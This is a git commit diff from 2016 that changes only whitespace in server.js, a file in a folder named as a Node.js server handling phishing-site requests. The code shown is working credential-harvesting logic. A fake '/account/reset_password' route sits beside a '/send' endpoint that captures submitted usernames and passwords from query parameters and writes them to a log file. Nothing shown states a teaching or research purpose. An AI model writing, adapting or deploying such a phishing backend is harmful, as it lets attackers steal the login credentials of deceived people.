ef5ee223d283c564fe1db1f938265fa75c8c0959
poanchen <chen.baron@hotmail.com>
2016-09-26 00:54:03 -0700

    fix formatting issue (use space instead of tab)

--- 2. node js server that handle the phishing site request/server.js
+++ 2. node js server that handle the phishing site request/server.js
@@ -11,7 +11,7 @@ function writeToLogFile(contents) {
 }
 
 function getIpAddress (req) {
-	return req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress || req.connection.socket.remoteAddress;
+  return req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress || req.connection.socket.remoteAddress;
 }
 
 app.get('/account/reset_password', function (req, res) {
@@ -25,16 +25,16 @@ app.get('/account/reset_password', function (req, res) {
 })
 
 app.get('/send', function (req, res) {
-	var contents
-	if (req.query.u || req.query.p) {
+  var contents
+  if (req.query.u || req.query.p) {
     if (req.query.u) {
       contents = "Possible username is " + "'" + req.query.u + "'"
     }
     if (req.query.p) {
-			contents += '\n' + "Possible password is " + "'" + req.query.p + "'"
+      contents += '\n' + "Possible password is " + "'" + req.query.p + "'"
     }
     writeToLogFile(contents)
-	}
+  }
   res.send({ stats: "success" })
 })
 
